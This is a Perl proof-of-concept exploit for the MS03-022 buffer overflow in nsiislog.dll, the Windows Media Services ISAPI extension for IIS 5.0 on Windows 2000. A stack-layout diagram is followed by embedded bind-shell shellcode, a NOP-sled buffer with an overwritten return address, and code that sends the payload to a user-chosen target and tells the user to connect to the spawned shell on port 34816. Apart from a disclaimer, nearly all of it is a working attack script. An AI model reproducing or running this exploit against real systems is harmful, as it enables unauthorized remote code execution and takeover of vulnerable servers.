#!/usr/bin/perl
#ooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOO
#
#  ************************************************** !!! WARNING !!! ***********************************************************
#  *                                            FOR SECURITY TESTiNG ONLY!                                                      *
#  ******************************************************************************************************************************
#  * By using this code you agree that I makes no warranties or representations, express or implied, about the                  *
#  * accuracy, timeliness or completeness of this, including without limitations the implied warranties of                      *
#  * merchantability and fitness for a particular purpose.                                                                      *
#  * I makes NO Warranty of non-infringement. This code may contain technical inaccuracies or typographical errors.             *
#  * This code can never be copyrighted or owned by any commercial company, under no circumstances what so ever.                *
#  * but can be use for as long the developer, are giving explicit approval of the usage, and the user understand               *
#  * and approve of all the parts written in this notice.                                                                       *
#  * This program may NOT be used by any Danish company, unless explicit written permission from the developer .                *
#  * Neither myself nor any of my Affiliates shall be liable for any direct, incidental, consequential, indirect                *
#  * or punitive damages arising out of access to, inability to access, or any use of the content of this code,                 *
#  * including without limitation any PC, other equipment or other property, even if I am Expressly advised of                  *
#  * the possibility of such damages. I DO NOT encourage criminal activities. If you use this code or commit                    *
#  * criminal acts with it, then you are solely responsible for your own actions and by use, downloading,transferring,          *
#  * and/or reading anything from this code you are considered to have accepted the terms and conditions and have read          *
#  * this disclaimer. Once again this code is for penetration testing purposes only. And once again, DO NOT DISTRIBUTE!         *
#  ******************************************************************************************************************************

# 
#	NOTICE:
#       Flaw in ISAPI Extension for Windows Media Services Could Cause Code Execution (822343) 
#       MS Bulletin posted: June 25, 2003 
#       http://www.microsoft.com/technet/security/bulletin/MS03-022.asp 
# 
#       Affected Software: 
#       Microsoft Windows 2000 Server SP1, SP2, SP3 SP4, if not Hotfix MS03-022 is applied
# 
#       Public disclosure on June 25, 2003 
#       http://packetstormsecurity.nl/0306-advisories/wmediaremote.txt 
#       by brett.moore@security-assessment.com 
#       http://www.security-assessment.com 
# 
#       Tested on : 
#        - Windows 2000 Server SP1 <--- Attack successfully
#	 - Windows 2000 Server SP2 <--- Attack successfully
#	 - Windows 2000 Server SP3 <--- Attack successfully
#	 - Windows 2000 Server SP4 <--- Attack successfully
#       
#       The following error will end up in the event viewer: 
#               ------------------------------------------------------------------------ 
#               Event Type:     Warning 
#               Event Source:   W3SVC 
#               Event Category: None 
#               Event ID:       37 
#               Description: 
#               Out of process application '/LM/W3SVC/1/Root' terminated unexpectedly. 
#               ------------------------------------------------------------------------ 
# 
#   STACK DESCRIPTION 
# |---------------------| 
# |9988 bytes of NOP's  | 
# |---------------------| 
# |EB08 = JMP SHORT + 8 | <---- This is where the CALL EBX hits. Now we make it JMP 9 bytes down ---| 
# |---------------------|                                                                           | 
# |  2 bytes of NOP's   |       2 bytes                                                             | Why JMP:
# |---------------------|                                                                           | We make this jump
# |   EIP = 40f01333    |       This is where we goto the CALL EBX function address 0x40f01333      | to get pass EIP to
# |---------------------|                                                                           | our shellcode
# |  4 bytes of NOP's   |       4 bytes      <------------------------------------------------------´ 
# |---------------------|                                                                           
# |     SHELLCODE       | 
# |---------------------| 
# |  66 bytes of NOP's  | 
# |---------------------| 
#
#        Information: 
#          - Now you should have a Remote shell on port: 34816 else try sending it a few times 
#          - This Proof-Of-Concept Exploit is Coded by Dennis Rand & Dan Faerch
#  
# 
use IO::Socket; 
use Getopt::Long; 

my $host_header; 



#  Shellcode
#  Shellcode size:              1699 bytes 
#  Remote port:                 34816 
#  Works on:	 		Windows 2000 SP1, SP2, SP3, SP4 without HOTFIX
#  Shellcode development:	firew0rker //tN [The N0b0D1eS]
#  
$egg = join ("", 
"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5b\x81\xeb\x4d\x43\x22\x11\x8b\xc3\x05\x66\x43\x22\x11\x66", 
"\xb9\x15\x03\x80\x30\xfb\x40\x67\xe2\xf9\x33\xa3\xf9\xfb\x72\x66\x53\x06\x04\x04\x76\x66\x37\x06", 
"\x04\x04\xa8\x40\xf6\xbd\xd9\xea\xf8\x66\x53\x06\x04\x04\xa8\x93\xfb\xfb\x04\x04\x13\x91\xfa\xfb", 
"\xfb\x43\xcd\xbd\xd9\xea\xf8\x7e\x53\x06\x04\x04\xab\x04\x6e\x37\x06\x04\x04\xf0\x3b\xf4\x7f\xbe", 
"\xfa\xfb\xfb\x76\x66\x3b\x06\x04\x04\xa8\x40\xba\xbd\xd9\xea\xf8\x66\x53\x06\x04\x04\xa8\xab\x13", 
"\xcc\xfa\xfb\xfb\x76\x7e\x8f\x05\x04\x04\xab\x93\xfa\xfa\xfb\xfb\x04\x6e\x4b\x06\x04\x04\xc8\x20", 
"\xa8\xa8\xa8\x91\xfd\x91\xfa\x91\xf9\x04\x6e\x3b\x06\x04\x04\x72\x7e\xa7\x05\x04\x04\x9d\x3c\x7e", 
"\x9f\x05\x04\x04\xf9\xfb\x9d\x3c\x7e\x9d\x05\x04\x04\x73\xfb\x3c\x7e\x93\x05\x04\x04\xfb\xfb\xfb", 
"\xfb\x76\x66\x9f\x05\x04\x04\x91\xeb\xa8\x04\x4e\xa7\x05\x04\x04\x04\x6e\x47\x06\x04\x04\xf0\x3b", 
"\x8f\xe8\x76\x6e\x9c\x05\x04\x04\x05\xf9\x7b\xc1\xfb\xf4\x7f\x46\xfb\xfb\xfb\x10\x2f\x91\xfa\x04", 
"\x4e\xa7\x05\x04\x04\x04\x6e\x43\x06\x04\x04\xf0\x3b\xf4\x7e\x5e\xfb\xfb\xfb\x3c\x7e\x9b\x05\x04", 
"\x04\xeb\xfb\xfb\xfb\x76\x7e\x9b\x05\x04\x04\xab\x76\x7e\x9f\x05\x04\x04\xab\x04\x4e\xa7\x05\x04", 
"\x04\x04\x6e\x4f\x06\x04\x04\x72\x7e\xa3\x05\x04\x04\x07\x76\x46\xf3\x05\x04\x04\xc8\x3b\x42\xbf", 
"\xfb\xfb\xfb\x08\x51\x3c\x7e\xcf\x05\x04\x04\xfb\xfa\xfb\xfb\x70\x7e\xa3\x05\x04\x04\x72\x7e\xbf", 
"\x05\x04\x04\x72\x7e\xb3\x05\x04\x04\x72\x7e\xbb\x05\x04\x04\x3c\x7e\xf3\x05\x04\x04\xbf\xfb\xfb", 
"\xfb\xc8\x20\x76\x7e\x03\x06\x04\x04\xab\x76\x7e\xf3\x05\x04\x04\xab\xa8\xa8\x93\xfb\xfb\xfb\xf3", 
"\x91\xfa\xa8\xa8\x43\x8c\xbd\xd9\xea\xf8\x7e\x53\x06\x04\x04\xab\xa8\x04\x6e\x3f\x06\x04\x04\x04", 
"\x4e\xa3\x05\x04\x04\x04\x6e\x57\x06\x04\x04\x12\xa0\x04\x04\x04\x04\x6e\x33\x06\x04\x04\x13\x76", 
"\xfa\xfb\xfb\x33\xef\xfb\xfb\xac\xad\x13\xfb\xfb\xfb\xfb\x7a\xd7\xdf\xf9\xbe\xd9\xea\x43\x0e\xbe", 
"\xd9\xea\xf8\xff\xdf\x78\x3f\xff\xab\x9f\x9c\x04\xcd\xfb\xfb\x72\x9e\x03\x13\xfb\xfb\xfb\xfb\x7a", 
"\xd7\xdf\xd8\xbe\xd9\xea\x43\xac\xbe\xd9\xea\xf8\xff\xdf\x78\x3f\xff\x72\xbe\x07\x9f\x9c\x72\xdd", 
"\xfb\xfb\x70\x86\xf3\x9d\x7a\xc4\xb6\xa1\x8e\xf4\x70\x0c\xf8\x8d\xc7\x7a\xc5\xab\xbe\xfb\xfb\x8e", 
"\xf9\x10\xf3\x7a\x14\xfb\xfb\xfa\xfb\x10\x19\x72\x86\x0b\x72\x8e\x17\x70\x86\xf7\x42\x6d\xfb\xfb", 
"\xfb\xc9\x3b\x09\x55\x72\x86\x0f\x70\x34\xd0\xb6\xf7\x70\xad\x83\xf8\xae\x0b\x70\xa1\xdb\xf8\xa6", 
"\x0b\xc8\x3b\x70\xc0\xf8\x86\x0b\x70\x8e\xf7\xaa\x08\x5d\x8e\xfe\x78\x3f\xff\x10\xf1\xa2\x78\x38", 
"\xff\xbb\xc0\xb9\xe3\x8e\x1f\xc0\xb9\xe3\x8e\xf9\x10\xb8\x70\x89\xdf\xf8\x8e\x0b\x2a\x1b\xf8\x3d", 
"\xf4\x4c\xfb\x70\x81\xe7\x3a\x1b\xf9\xf8\xbe\x0b\xf8\x3c\x70\xfb\xf8\xbe\x0b\x70\xb6\x0f\x72\xb6", 
"\xf7\x70\xa6\xeb\x72\xf8\x78\x96\xeb\xff\x70\x8e\x17\x7b\xc2\xfb\x8e\x7c\x9f\x9c\x74\xfd\xfb\xfb", 
"\x78\x3f\xff\xa5\xa4\x32\x39\xf7\xfb\x70\x86\x0b\x12\x99\x04\x04\x04\x33\xfb\xfb\xfb\x70\xbe\xeb", 
"\x7a\x53\x67\xfb\xfb\xfb\xfb\xfb\xfa\xfb\x43\xfb\xfb\xfb\xfb\x32\x38\xb7\x94\x9a\x9f\xb7\x92\x99", 
"\x89\x9a\x89\x82\xba\xfb\xbe\x83\x92\x8f\xab\x89\x94\x98\x9e\x88\x88\xfb\xb8\x89\x9e\x9a\x8f\x9e", 
"\xab\x89\x94\x98\x9e\x88\x88\xba\xfb\xfb\xac\xa8\xc9\xa4\xc8\xc9\xd5\xbf\xb7\xb7\xfb\xac\xa8\xba", 
"\xa8\x94\x98\x90\x9e\x8f\xba\xfb\x99\x92\x95\x9f\xfb\x97\x92\x88\x8f\x9e\x95\xfb\x9a\x98\x98\x9e", 
"\x8b\x8f\xfb\xac\xa8\xba\xa8\x8f\x9a\x89\x8f\x8e\x8b\xfb\x98\x97\x94\x88\x9e\x88\x94\x98\x90\x9e", 
"\x8f\xfb\xfb\x98\x96\x9f\xfb\xe9\xc4\xfc\xff\xff\x74\xf9\x75\xf7"); 



$buf  = "\x90" x 9988;          # 9988 bytes of NOP
$buf .= "\xEB\x08";             # JMP SHORT + 9 to jump pass the EIP in the Stack 
$buf .= "\x90\x90";             # 2 bytes of NOP's 
$buf .=  pack("l",0x40F01333);  # 0x40F01333 Is where our "CALL EBX" is located so lets point EIP to that location.
$buf .= "\x90\x90\x90\x90";     # Even more NOP's 
$buf .=  $egg;                  # 1699 bytes of Shellcode 
$buf .= "\x90" x 60;            # 60 bytes of NOP's 



GetOptions( 
        "target=s"      => \$target, 
        "port=i"        => \$port, 
        "help|?"        => sub { 
                                print "\n" x 90; 
                                print "\t #################################################\n"; 
                                print "\t #  Windows Media Services OverFlow for IIS 5.0  #\n"; 
                                print "\t #  ************* !!! WARNING !!! ************   #\n"; 
                                print "\t #  ************ DO NOT DISTRIBUTE ***********   #\n"; 
                                print "\t #  ** FOR PRIVATE AND EDUCATIONAL USE ONLY! *   #\n"; 
                                print "\t #  ******************************************   #\n"; 
                                print "\t #      (c)2003 by Dennis Rand & Dan Faerch      #\n"; 
                                print "\t #################################################\n"; 
                                print "\n\t -target\t\t eg.: 127.0.0.1\n"; 
                                print "\t -port\t\t\t eg.: 80\n\n"; 
                                print "\tUsage eg.: nsiislog.pl -t 127.0.0.1 -p 80\n"; 
                                exit; 
                                } 
); 

$error .= "Error: You must specify a target host\n" if ((!$target)); 
$error .= "Error: You must specify a port number\n" if ((!$port)); 



if ($error) { 
        print "Try nsiislog.pl -help or -?' for more information.\n$error\n" ; 
        exit; 
} 

$host_header = "Host: $target\r\nAccept: */*\r\nContent-Type: test/plain\r\nContent-Length: ".length($buf)."\r\n"; 

if ($target){ 
print "\n" x 90; 
print "\nWindows Media Services for IIS 5.0 Buffer Overflow attack - $target on port $port ..."; 
print "\n\n"; 
$host = $target; 
attack(); 
}; 



sub attack { 
print ". Shellcode Size: 1699 bytes\n"; 
print ". Preparing Exploit Buffer......Ready\n"; 
print ". Connecting To Target\n"; 
$| = 1; 
my $connection = IO::Socket::INET->new(Proto =>"tcp", 
                                PeerAddr =>$target, 
                                PeerPort =>$port) || die ". The server located at $target port $port failed to respond \n";

print ". Sending Exploit\n"; 
print $connection "POST /scripts/nsiislog.dll HTTP/1.1\r\n$host_header\r\n$buf\r\n\r\nFUCK$buf\r\n\r\n"; 
close $connection; 
print ". Exploit Delivered at target - Byte size ".length($buf)."\n\n"; 
print ". Now try connecting to port 34816, with telnet or NetCat\n\n"; 
exit; 
};  # end connect subroutine. 